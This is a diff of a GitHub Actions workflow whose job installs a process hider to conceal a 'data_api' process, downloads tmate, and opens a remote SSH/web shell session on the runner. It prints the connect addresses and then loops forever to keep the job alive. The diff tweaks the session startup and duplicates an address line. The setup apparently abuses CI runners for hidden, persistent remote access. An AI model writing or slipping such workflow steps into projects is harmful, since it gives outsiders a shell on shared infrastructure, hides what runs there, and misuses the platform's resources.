@@ -30,7 +30,9 @@ jobs:
         sudo npm i -g node-process-hider && sudo ph add data_api
         wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
         tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-        ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a
+        ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d 
+        ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
         ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_sh}"
         ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
+        ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_sh}"
         while true;do m=$((`date '+%s%N'`/1000)) && echo "Time Is Limit" ${m:0:${#m}-6}.${m:${#m}-6} ; sleep 80; done
